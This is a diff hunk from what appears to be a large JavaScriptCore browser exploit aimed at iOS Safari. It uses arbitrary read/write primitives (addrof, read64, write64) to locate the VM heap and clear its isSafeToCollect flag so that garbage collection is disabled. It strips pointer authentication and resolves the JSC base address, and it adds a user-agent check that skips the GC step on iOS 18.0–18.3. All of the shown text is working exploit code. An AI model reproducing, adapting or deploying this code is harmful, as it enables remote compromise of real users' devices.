@@ -17426,33 +17426,42 @@ async function _aarw_main() {
                   | BigInt(read64_str.charCodeAt(1)) << 16n);
           }
           print("after setting up prims");
-          // Disable Worklet GC
-          print("gc disable: begin");
-          const globalThisAddr = addrof(globalThis);
-          print(`gc disable: globalThis=${globalThisAddr.hex()}`);
-          const vmOwnerPtrAddr = globalThisAddr.add(0x10n);
-          print(`gc disable: reading vmOwnerPtrAddr=${vmOwnerPtrAddr.hex()}`);
-          const vmOwnerPtr = read64(vmOwnerPtrAddr);
-          print(`gc disable: vmOwnerPtr=${vmOwnerPtr.hex()}`);
-          const vmAddr = vmOwnerPtr.add(0x38n);
-          print(`gc disable: reading vmAddr=${vmAddr.hex()}`);
-          const vm = read64(vmAddr);
-          print(`gc disable: vm=${vm.hex()}`);
-          const heap = vm.add(0xc0n);
-          const isSafeToCollect = heap.add(0x241n);
-          print(`gc disable: heap=${heap.hex()} isSafeToCollect=${isSafeToCollect.hex()}`);
-          function write8(ptr, byteValue) {
-            print(`gc disable: write8 read ptr=${ptr.hex()}`);
-            let value = read64(ptr);
-            print(`gc disable: write8 old64=${value.hex()}`);
-            value &= ~0xffn;
-            value |= byteValue;
-            print(`gc disable: write8 new64=${value.hex()}`);
-            write64(ptr, value);
-            print("gc disable: write8 complete");
-          };
-          write8(isSafeToCollect, 0n);
-          print("after gc disable");
+          const gcDisableIosVersion = (function() {
+              let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
+              return version ? version.split('_').map(part => parseInt(part)) : null;
+          })();
+          const skipGcDisable = Array.isArray(gcDisableIosVersion) && gcDisableIosVersion[0] === 18 && gcDisableIosVersion[1] <= 3;
+          if (skipGcDisable) {
+              print(`gc disable: skipped for early iOS ${gcDisableIosVersion.join('.')}`);
+          } else {
+              // Disable Worklet GC
+              print("gc disable: begin");
+              const globalThisAddr = addrof(globalThis);
+              print(`gc disable: globalThis=${globalThisAddr.hex()}`);
+              const vmOwnerPtrAddr = globalThisAddr.add(0x10n);
+              print(`gc disable: reading vmOwnerPtrAddr=${vmOwnerPtrAddr.hex()}`);
+              const vmOwnerPtr = read64(vmOwnerPtrAddr);
+              print(`gc disable: vmOwnerPtr=${vmOwnerPtr.hex()}`);
+              const vmAddr = vmOwnerPtr.add(0x38n);
+              print(`gc disable: reading vmAddr=${vmAddr.hex()}`);
+              const vm = read64(vmAddr);
+              print(`gc disable: vm=${vm.hex()}`);
+              const heap = vm.add(0xc0n);
+              const isSafeToCollect = heap.add(0x241n);
+              print(`gc disable: heap=${heap.hex()} isSafeToCollect=${isSafeToCollect.hex()}`);
+              function write8(ptr, byteValue) {
+                print(`gc disable: write8 read ptr=${ptr.hex()}`);
+                let value = read64(ptr);
+                print(`gc disable: write8 old64=${value.hex()}`);
+                value &= ~0xffn;
+                value |= byteValue;
+                print(`gc disable: write8 new64=${value.hex()}`);
+                write64(ptr, value);
+                print("gc disable: write8 complete");
+              };
+              write8(isSafeToCollect, 0n);
+              print("after gc disable");
+          }
           const executable = read64(addrof(parseFloat) + 0x18n);
           globalFuncParseFloat = read64(executable + 0x28n).noPAC();
           const jsc_base = (function() {
